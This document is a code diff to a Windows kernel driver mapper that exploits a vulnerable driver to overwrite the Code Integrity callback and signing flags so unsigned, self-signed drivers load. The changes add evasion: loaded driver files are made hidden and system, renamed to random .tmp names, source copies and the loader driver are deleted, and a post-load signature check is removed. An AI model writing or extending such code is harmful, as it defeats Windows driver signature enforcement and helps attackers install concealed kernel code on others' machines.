@@ -11,9 +11,22 @@
 #include <wintrust.h>
 #include <softpub.h>
 #include <wincrypt.h>
+#include <io.h>
 
 // ============ DEBUG LOGGING ============
 FILE* g_LogFile = nullptr;
+
+void FlushMapperLogFile() {
+    if (!g_LogFile) {
+        return;
+    }
+
+    fflush(g_LogFile);
+    intptr_t osHandle = _get_osfhandle(_fileno(g_LogFile));
+    if (osHandle != -1) {
+        FlushFileBuffers(reinterpret_cast<HANDLE>(osHandle));
+    }
+}
 
 static void DbgLog(const char* func, const char* fmt, ...) {
     char buf[2048];
@@ -36,7 +49,7 @@ static void DbgLog(const char* func, const char* fmt, ...) {
     // File log
     if (g_LogFile) {
         fprintf(g_LogFile, "%s\n", buf);
-        fflush(g_LogFile);
+        FlushMapperLogFile();
     }
 }
 
@@ -50,6 +63,9 @@ static void OpenMapperLog()
     DWORD envLen = GetEnvironmentVariableA("AIDA_MAPPER_LOG", logPath, static_cast<DWORD>(sizeof(logPath)));
     if (envLen > 0 && envLen < sizeof(logPath)) {
         fopen_s(&g_LogFile, logPath, "w");
+        if (g_LogFile) {
+            setvbuf(g_LogFile, nullptr, _IONBF, 0);
+        }
     }
 
     if (!g_LogFile) {
@@ -61,12 +77,18 @@ static void OpenMapperLog()
                 *(lastSlash + 1) = '\0';
                 strncat_s(exePath, sizeof(exePath), "WindMapper_debug.log", _TRUNCATE);
                 fopen_s(&g_LogFile, exePath, "w");
+                if (g_LogFile) {
+                    setvbuf(g_LogFile, nullptr, _IONBF, 0);
+                }
             }
         }
     }
 
     if (!g_LogFile) {
         fopen_s(&g_LogFile, "C:\\WindMapper_debug.log", "w");
+        if (g_LogFile) {
+            setvbuf(g_LogFile, nullptr, _IONBF, 0);
+        }
     }
 
     if (!g_LogFile) {
@@ -373,6 +395,39 @@ namespace Utils {
         return FALSE;
     }
 
+    BOOL HideLoadedImagePath(PCWSTR filePath) {
+        if (!filePath || !filePath[0])
+            return FALSE;
+
+        DWORD attr = GetFileAttributesW(filePath);
+        if (attr == INVALID_FILE_ATTRIBUTES) {
+            DWORD gle = GetLastError();
+            return gle == ERROR_FILE_NOT_FOUND || gle == ERROR_PATH_NOT_FOUND;
+        }
+
+        SetFileAttributesW(filePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
+
+        std::wstring cleanupPath = filePath;
+        PCWSTR lastSlash = wcsrchr(filePath, L'\\');
+        if (lastSlash && lastSlash > filePath) {
+            std::wstring dir(filePath, lastSlash - filePath);
+            std::wstring renamePath = dir + L"\\" + GenerateRandomName(16) + L".tmp";
+            if (MoveFileW(filePath, renamePath.c_str())) {
+                cleanupPath = renamePath;
+                SetFileAttributesW(cleanupPath.c_str(),
+                    FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
+            }
+        }
+
+        BOOL scheduled = MoveFileExW(cleanupPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+        if (!scheduled) {
+            SetFileAttributesW(cleanupPath.c_str(),
+                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
+        }
+
+        return scheduled || cleanupPath != filePath;
+    }
+
     std::wstring GetTempFilePath(PCWSTR extension) {
         std::wstring dir = GetRandomSystemDirectory();
         if (dir.empty())
@@ -382,13 +437,37 @@ namespace Utils {
         return dir + L"\\" + name + extension;
     }
 
+    std::wstring GetSiblingTempFilePath(PCWSTR basePath, PCWSTR extension) {
+        if (!basePath || !basePath[0])
+            return GetTempFilePath(extension);
+
+        PCWSTR slash = wcsrchr(basePath, L'\\');
+        if (!slash || slash == basePath)
+            return GetTempFilePath(extension);
+
+        std::wstring dir(basePath, slash - basePath);
+        if (dir.empty())
+            return GetTempFilePath(extension);
+
+        std::wstring probe = dir + L"\\" + GenerateRandomName(8) + L".tmp";
+        HANDLE hProbe = CreateFileW(probe.c_str(), GENERIC_WRITE, 0, nullptr,
+            CREATE_NEW, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
+        if (hProbe == INVALID_HANDLE_VALUE)
+            return GetTempFilePath(extension);
+
+        CloseHandle(hProbe);
+        return dir + L"\\" + GenerateRandomName(12) + extension;
+    }
+
 
 }
 
 namespace MapperCore {
 
     NTSTATUS TriggerExploit(PCWSTR targetDriverFileName, PCWSTR sentinelDriverFileName,
-                            PCWSTR shadowFsDriverFileName) {
+                            PCWSTR shadowFsDriverFileName, PCWSTR targetDriverFullPath,
+                            PCWSTR sentinelDriverFullPath, PCWSTR shadowFsDriverFullPath,
+                            PCWSTR loaderDriverFullPath) {
         LOG("=== TriggerExploit START ===");
         LOG("Target driver: %ls", targetDriverFileName ? targetDriverFileName : L"(null)");
         LOG("Sentinel driver: %ls", sentinelDriverFileName ? sentinelDriverFileName : L"(null)");
@@ -456,12 +535,31 @@ namespace MapperCore {
                         LOG("Target driver service path: %ls", g_DriverServicePath);
                         status = DriverLoader::LoadDriver(g_DriverServicePath);
                         LOG_STATUS("LoadDriver (WhosWho/target)", status);
+                        if (NT_SUCCESS(status) && targetDriverFullPath && targetDriverFullPath[0]) {
+                            LOG("Hiding target driver file immediately after load: %ls", targetDriverFullPath);
+                            if (Utils::HideLoadedImagePath(targetDriverFullPath)) {
+                                LOG("Target driver file hidden/renamed after load");
+                            } else {
+                                LOG("WARNING: Target driver file hide deferred after load, GLE=%u", GetLastError());
+                            }
+                        }
 
-                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
+                        NTSTATUS sentStatus = STATUS_SUCCESS;
                         if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                             LOG("Loading sentinel driver, service path: %ls", g_SentinelServicePath);
                             sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
                             LOG_STATUS("LoadDriver (Sentinel)", sentStatus);
+                            if (NT_SUCCESS(sentStatus) && sentinelDriverFullPath && sentinelDriverFullPath[0]) {
+                                LOG("Hiding sentinel driver file immediately after load: %ls", sentinelDriverFullPath);
+                                if (Utils::HideLoadedImagePath(sentinelDriverFullPath)) {
+                                    LOG("Sentinel driver file hidden/renamed after load");
+                                } else {
+                                    LOG("WARNING: Sentinel driver file hide deferred after load, GLE=%u", GetLastError());
+                                }
+                            }
+                            if (!NT_SUCCESS(sentStatus) && sentStatus != STATUS_IMAGE_ALREADY_LOADED) {
+                                LOG("FATAL: Sentinel load is required and failed with status 0x%08X", (DWORD)sentStatus);
+                            }
                         } else if (!NT_SUCCESS(status)) {
                             LOG("Skipping Sentinel load because target driver failed");
                         }
@@ -471,6 +569,14 @@ namespace MapperCore {
                             LOG("Loading shadowfs driver, service path: %ls", g_ShadowFsServicePath);
                             shadowFsStatus = DriverLoader::LoadDriver(g_ShadowFsServicePath);
                             LOG_STATUS("LoadDriver (ShadowFS)", shadowFsStatus);
+                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFullPath && shadowFsDriverFullPath[0]) {
+                                LOG("Hiding shadowfs driver file immediately after load: %ls", shadowFsDriverFullPath);
+                                if (Utils::HideLoadedImagePath(shadowFsDriverFullPath)) {
+                                    LOG("ShadowFS driver file hidden/renamed after load");
+                                } else {
+                                    LOG("WARNING: ShadowFS driver file hide deferred after load, GLE=%u", GetLastError());
+                                }
+                            }
                         } else if (!NT_SUCCESS(status)) {
                             LOG("Skipping ShadowFS load because target driver failed");
                         }
@@ -479,6 +585,11 @@ namespace MapperCore {
                         NTSTATUS restoreStatus = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                         LOG_STATUS("WriteKernelMemory (CI restore)", restoreStatus);
                         g_CiCallbackPatched = false;
+
+                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0] &&
+                            !NT_SUCCESS(sentStatus) && sentStatus != STATUS_IMAGE_ALREADY_LOADED) {
+                            status = sentStatus;
+                        }
 
                         if (NT_SUCCESS(status)) {
                             LOG("Patching driver signing flags for target: %ls", targetDriverFileName);
@@ -526,18 +637,29 @@ namespace MapperCore {
                     BOOL wsgResult = WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
                                              whoswhoBase, whoswhoImageSize);
                     LOG("WriteSentinelGlobals result: %s", wsgResult ? "OK" : "FAILED");
+                    if (!wsgResult) {
+                        LOG("WriteSentinelGlobals failed; continuing because Sentinel performs in-driver bridge discovery");
+                    }
                 } else {
-                    LOG("ERROR: Could not find WhosWho driver in loaded modules!");
+                    LOG("WARNING: Could not find WhosWho driver in loaded modules; continuing because Sentinel performs in-driver bridge discovery");
                 }
             } else {
-                LOG("ERROR: Could not find Sentinel driver in loaded modules!");
+                LOG("WARNING: Could not find Sentinel driver in loaded modules; continuing because Sentinel performs in-driver bridge discovery");
             }
         }
 
 
         LOG("Closing vuln device and unloading loader driver...");
         VulnDriver::CloseDevice(deviceHandle);
-        DriverLoader::UnloadDriver(g_LoaderServicePath);
+        NTSTATUS unloadStatus = DriverLoader::UnloadDriver(g_LoaderServicePath);
+        if (NT_SUCCESS(unloadStatus) && loaderDriverFullPath && loaderDriverFullPath[0]) {
+            LOG("Deleting loader driver file immediately after unload: %ls", loaderDriverFullPath);
+            if (Utils::ForceDeleteOrRename(loaderDriverFullPath)) {
+                LOG("Loader driver file deleted/renamed immediately after unload");
+            } else {
+                LOG("WARNING: Loader driver file deletion deferred after unload, GLE=%u", GetLastError());
+            }
+        }
 
         LOG("=== TriggerExploit END, status=0x%08X ===", (DWORD)status);
         return status;
@@ -744,24 +866,26 @@ namespace MapperCore {
         }
 
         LOG("Calling TriggerExploit...");
-        status = TriggerExploit(targetFileName, sentinelFileName, shadowFsFileName);
+        status = TriggerExploit(targetFileName, sentinelFileName, shadowFsFileName,
+                                driverFullPath, sentinelFullPath, shadowFsFullPath,
+                                loaderFullPath);
         LOG_STATUS("TriggerExploit", status);
         if (NT_SUCCESS(status)) {
-            LOG("Cleaning up driver file: %ls", driverFullPath);
-            if (Utils::ForceDeleteOrRename(driverFullPath)) {
-                LOG("Driver file deleted/renamed OK");
+            LOG("Hiding loaded driver file: %ls", driverFullPath);
+            if (Utils::HideLoadedImagePath(driverFullPath)) {
+                LOG("Driver file hidden/renamed OK");
             } else {
-                LOG("WARNING: Failed to delete driver file");
+                LOG("WARNING: Failed to hide loaded driver file");
             }
 
             if (sentinelFullPath[0]) {
-                if (Utils::ForceDeleteOrRename(sentinelFullPath)) {
+                if (Utils::HideLoadedImagePath(sentinelFullPath)) {
                 } else {
                 }
             }
 
             if (shadowFsFullPath[0]) {
-                if (Utils::ForceDeleteOrRename(shadowFsFullPath)) {
+                if (Utils::HideLoadedImagePath(shadowFsFullPath)) {
                 } else {
                 }
             }
@@ -1196,11 +1320,13 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
+    LOG("InitializeNtFunctions_begin");
     if (!Utils::InitializeNtFunctions()) {
         LOG("FATAL: InitializeNtFunctions failed");
         if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
+    LOG("InitializeNtFunctions_ok");
 
     LOG("Initializing embedded driver data...");
     if (!InitializeDriverData()) {
@@ -1266,6 +1392,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
+    LOG("CreateFileW loader_begin path=%ls", loaderFilePath.c_str());
     HANDLE loaderFile = CreateFileW(
         loaderFilePath.c_str(),
         GENERIC_WRITE,
@@ -1282,9 +1409,11 @@ int main(int argc, char* argv[]) {
         if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
+    LOG("CreateFileW loader_ok handle=%p", loaderFile);
 
     DWORD written = 0;
     DWORD expectedSize = static_cast<DWORD>(g_P2CDriverSize);
+    LOG("WriteFile loader_begin bytes=%u", expectedSize);
     BOOL writeOk = WriteFile(loaderFile, g_P2CDriverData, expectedSize, &written, nullptr);
     DWORD writeErr = GetLastError();
     FlushFileBuffers(loaderFile);
@@ -1300,17 +1429,24 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     LOG("Copying target driver from %ls to %ls", driverArg.c_str(), driverFilePath.c_str());
+    LOG("CopyFileW target_begin");
     if (!CopyFileW(driverArg.c_str(), driverFilePath.c_str(), FALSE)) {
         LOG("FATAL: CopyFileW for target driver failed, GLE=%u", GetLastError());
         Utils::ForceDeleteOrRename(loaderFilePath.c_str());
         if (g_LogFile) fclose(g_LogFile);
         return 1;
     }
+    LOG("CopyFileW target_ok");
+    if (Utils::ForceDeleteOrRename(driverArg.c_str())) {
+        LOG("Source target driver deleted after staging copy");
+    } else {
+        LOG("WARNING: Source target driver deletion deferred, GLE=%u", GetLastError());
+    }
 
 
     std::wstring sentinelFilePath;
     if (!sentinelArg.empty()) {
-        sentinelFilePath = Utils::GetTempFilePath(L".sys");
+        sentinelFilePath = Utils::GetSiblingTempFilePath(driverFilePath.c_str(), L".sys");
         LOG("Sentinel temp path: %ls", sentinelFilePath.c_str());
         if (sentinelFilePath.empty()) {
             LOG("FATAL: Failed to generate sentinel temp path");
@@ -1320,12 +1456,19 @@ int main(int argc, char* argv[]) {
             return 1;
         }
         LOG("Copying sentinel from %ls to %ls", sentinelArg.c_str(), sentinelFilePath.c_str());
+        LOG("CopyFileW sentinel_begin");
         if (!CopyFileW(sentinelArg.c_str(), sentinelFilePath.c_str(), FALSE)) {
             LOG("FATAL: CopyFileW for sentinel failed, GLE=%u", GetLastError());
             Utils::ForceDeleteOrRename(loaderFilePath.c_str());
             Utils::ForceDeleteOrRename(driverFilePath.c_str());
             if (g_LogFile) fclose(g_LogFile);
             return 1;
+        }
+        LOG("CopyFileW sentinel_ok");
+        if (Utils::ForceDeleteOrRename(sentinelArg.c_str())) {
+            LOG("Source sentinel driver deleted after staging copy");
+        } else {
+            LOG("WARNING: Source sentinel driver deletion deferred, GLE=%u", GetLastError());
         }
 
         LOG("Self-signing sentinel driver...");
@@ -1363,6 +1506,7 @@ int main(int argc, char* argv[]) {
             return 1;
         }
         LOG("Copying shadowfs from %ls to %ls", shadowFsArg.c_str(), shadowFsFilePath.c_str());
+        LOG("CopyFileW shadowfs_begin");
         if (!CopyFileW(shadowFsArg.c_str(), shadowFsFilePath.c_str(), FALSE)) {
             LOG("FATAL: CopyFileW for shadowfs failed, GLE=%u", GetLastError());
             Utils::ForceDeleteOrRename(loaderFilePath.c_str());
@@ -1371,6 +1515,12 @@ int main(int argc, char* argv[]) {
                 Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
             if (g_LogFile) fclose(g_LogFile);
             return 1;
+        }
+        LOG("CopyFileW shadowfs_ok");
+        if (Utils::ForceDeleteOrRename(shadowFsArg.c_str())) {
+            LOG("Source shadowfs driver deleted after staging copy");
+        } else {
+            LOG("WARNING: Source shadowfs driver deletion deferred, GLE=%u", GetLastError());
         }
 
         LOG("Self-signing shadowfs driver...");
@@ -1393,17 +1543,24 @@ int main(int argc, char* argv[]) {
     LOG_STATUS("WindLoadDriver final result", status);
 
     if (NT_SUCCESS(status)) {
-        LOG("SUCCESS - Running signature check...");
-        RunSignatureCheck(driverFilePath.c_str());
+        LOG("SUCCESS - skipping post-load signature file walk for volatile loaded image");
     }
 
     LOG("Cleaning up temp files...");
     Utils::ForceDeleteOrRename(loaderFilePath.c_str());
-    Utils::ForceDeleteOrRename(driverFilePath.c_str());
-    if (!sentinelFilePath.empty())
-        Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
-    if (!shadowFsFilePath.empty())
-        Utils::ForceDeleteOrRename(shadowFsFilePath.c_str());
+    if (NT_SUCCESS(status)) {
+        Utils::HideLoadedImagePath(driverFilePath.c_str());
+        if (!sentinelFilePath.empty())
+            Utils::HideLoadedImagePath(sentinelFilePath.c_str());
+        if (!shadowFsFilePath.empty())
+            Utils::HideLoadedImagePath(shadowFsFilePath.c_str());
+    } else {
+        Utils::ForceDeleteOrRename(driverFilePath.c_str());
+        if (!sentinelFilePath.empty())
+            Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
+        if (!shadowFsFilePath.empty())
+            Utils::ForceDeleteOrRename(shadowFsFilePath.c_str());
+    }
 
     MapperCore::CleanupArtifacts();
 
